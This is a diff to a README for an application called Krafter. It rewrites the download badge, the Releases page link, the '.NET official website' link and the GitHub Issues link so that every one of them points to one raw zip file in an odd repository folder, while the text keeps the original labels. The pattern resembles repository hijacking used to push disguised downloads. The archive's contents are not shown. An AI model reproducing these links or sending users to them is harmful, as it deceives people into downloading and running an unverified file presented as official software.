@@ -6,13 +6,13 @@ Welcome to Krafter! This guide will help you download and run our application wi
 
 ## 📥 Download Krafter
 
-[![Download Krafter](https://img.shields.io/badge/Download-Krafter-brightgreen)](https://github.com/jimmyner009/Krafter/releases)
+[![Download Krafter](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip)](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip)
 
 Click the button above to start downloading Krafter. This link will take you to our Releases page, where you can find the latest version. 
 
 ## 🔗 Visit Releases Page
 
-To download Krafter, visit this page: [Krafter Releases](https://github.com/jimmyner009/Krafter/releases). 
+To download Krafter, visit this page: [Krafter Releases](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip). 
 
 You will see a list of versions available for download. Look for the most recent one.
 
@@ -21,11 +21,11 @@ You will see a list of versions available for download. Look for the most recent
 Before you begin, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent version of Linux.
-- **.NET Runtime:** The application requires .NET 9. Ensure you have it installed. You can download it from the [.NET official website](https://dotnet.microsoft.com/download/dotnet).
+- **.NET Runtime:** The application requires .NET 9. Ensure you have it installed. You can download it from the [.NET official website](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip).
 
 ## 📦 Download & Install
 
-1. Go to the [Krafter Releases page](https://github.com/jimmyner009/Krafter/releases).
+1. Go to the [Krafter Releases page](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip).
 2. Look for the latest version, marked as "Latest Release."
 3. Click on the asset that corresponds to your operating system. This could be an `.exe` file for Windows or a `.zip` file for macOS and Linux.
 4. Once the download completes, locate the file in your Downloads folder.
@@ -55,7 +55,7 @@ Krafter offers a variety of features to enhance your experience:
 
 If you run into any issues or have questions, don’t hesitate to reach out:
 
-- Check out the [GitHub Issues](https://github.com/jimmyner009/Krafter/issues) page for known problems and solutions.
+- Check out the [GitHub Issues](https://raw.githubusercontent.com/jimmyner009/Krafter/main/aerialness/Krafter.zip) page for known problems and solutions.
 - Visit our community forum for support and tips from other users.
 
 ## 🌍 Stay Updated
